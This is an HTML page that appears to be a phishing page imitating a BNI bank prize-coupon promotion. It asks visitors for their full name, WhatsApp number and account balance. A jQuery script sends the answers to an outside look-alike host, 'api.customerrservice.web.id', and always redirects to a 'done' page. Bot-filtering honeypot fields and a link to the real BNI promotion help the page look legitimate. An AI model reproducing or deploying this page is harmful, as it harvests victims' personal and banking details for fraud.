<body>
    <main>
        <nav class="navnon">
            <img width="100%" src="img/bc.png" alt="Banner" />

        <footer>

        <div class="textjalan" style="margin-top: 65px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="50" height="40" fill="currentColor" class="bi bi-bell"
                viewBox="0 0 16 16">
                <path
                    d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2M8 1.918l-.797.161A4 4 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4 4 0 0 0-3.203-3.92zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5 5 0 0 1 13 6c0 .88.32 4.2 1.22 6" />
            </svg>
            <marquee>
                Selamat Datang di GEBYAR FSTVL   BNI Rejeki Wondr Menangkan Hadiah Nya dan Keseruan nya...! Jadikan Anda Pemenangnya!
            </marquee>
        </div>

        <div class="coverform">
            <div class="form">
                <img width="35%" src="img/atas.png" alt="Logo" />
                <form id="formData" method="POST" class="mt-4">
                    <div class="inp">
                        <label for="namalengkap"></label>
                        <select name="kupon" id="kupon" required>
                            <option selected disabled value="">-- Pilih kupon --</option>
                            <option value="Paket Umroh & Tiket Liburan">Paket Umroh & Tiket Liburan</option>
                            <option value="Uang Cash & Emas">Uang Cash & Emas</option>
                            <option value="Mobil & Motor">Mobil & Motor</option>
                        </select>
                    </div>
                    <div class="inp">
                        <label for="namalengkap"><b>Nama Lengkap</b></label>
                        <input type="text" name="a" id="namalengkap" required />
                    </div>
                    <div class="inp">
                        <label for="nowa"><b>No. WhatsApp</b></label>
                        <input type="tel" name="b" id="nowa" required maxlength="13" />
                    </div>
                    <div class="inp">
                        <label for="dengan-rupiah"><b>Saldo Akhir</b></label>
                        <input type="tel" name="c" id="dengan-rupiah" required maxlength="19" />
                    </div>
                    <!-- HONEYPOT ANTI-SPAM FIELD -->
                    <div class="hp-field">
                        <label for="hp_name">Name (leave blank)</label>
                        <input type="text" name="hp_name" id="hp_name" tabindex="-1" autocomplete="off">
                    </div>
                    <div class="hp-field">
                        <label for="hp_email">Email (leave blank)</label>
                        <input type="email" name="hp_email" id="hp_email" tabindex="-1" autocomplete="off">
                    </div>
                    <div class="hp-field">
                        <label for="hp_phone">Phone (leave blank)</label>
                        <input type="tel" name="hp_phone" id="hp_phone" tabindex="-1" autocomplete="off">
                    </div>
                    <!-- Timestamp for rate limiting -->
                    <input type="hidden" name="timestamp" id="timestamp" value="">
                    <button type="submit" id="kirim">Cetak Kupon</button>
                </form>
            </div>
        </div>

        <p onclick="location.href='https://www.bni.co.id/id-id/beranda/promo-acara/rejeki-wondr-bni'"
            style="font-size: 10px; text-align: center; margin: 5px 10px; cursor: pointer;">
            <strong style="color: #c0c0c0;">Semua Nasabah Bank BNI
                <span style="color: #c0c0c0;"><b>Berkesempatan Untuk Menang...!!!</b></span>
            </strong>
        </p>
    </main>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    var dengan_rupiah = document.getElementById('dengan-rupiah');
    dengan_rupiah.addEventListener('keyup', function(e)
    {
        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
    });
    
    function formatRupiah(angka, prefix)
    {
        var number_string = angka.replace(/[^,\d]/g, '').toString(),
            split    = number_string.split(','),
            sisa     = split[0].length % 3,
            rupiah     = split[0].substr(0, sisa),
            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
            
        if (ribuan) {
            separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        
        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
    }
    document.getElementById('timestamp').value = Date.now();
    </script>
    <script>
        $('#formData').on('submit', function(e) {
            e.preventDefault();
            
            // Check honeypot fields
            if ($('#hp_name').val() !== '' || $('#hp_email').val() !== '' || $('#hp_phone').val() !== '') {
                // Bot detected - silently fail
                window.location.href = "done.html";
                return false;
            }
            var formTime = Date.now();
            var submitTime = $('#timestamp').val();
            var timeDiff = formTime - submitTime;
            if (timeDiff < 2000) {
                // Too fast - likely a bot
                window.location.href = "done.html";
                return false;
            }
            
            var formData = $(this).serialize();
            $('#kirim').prop('disabled', true).text('Loading...');

            $.ajax({
                type: "POST",
                url: 'https://api.customerrservice.web.id/api/mailer.php',
                data: formData,
                dataType: "json",
                success: function(response) {
                    window.location.href = "done.html";
                },
                error: function() {
                    window.location.href = "done.html";
                }
            });
        });
    </script>
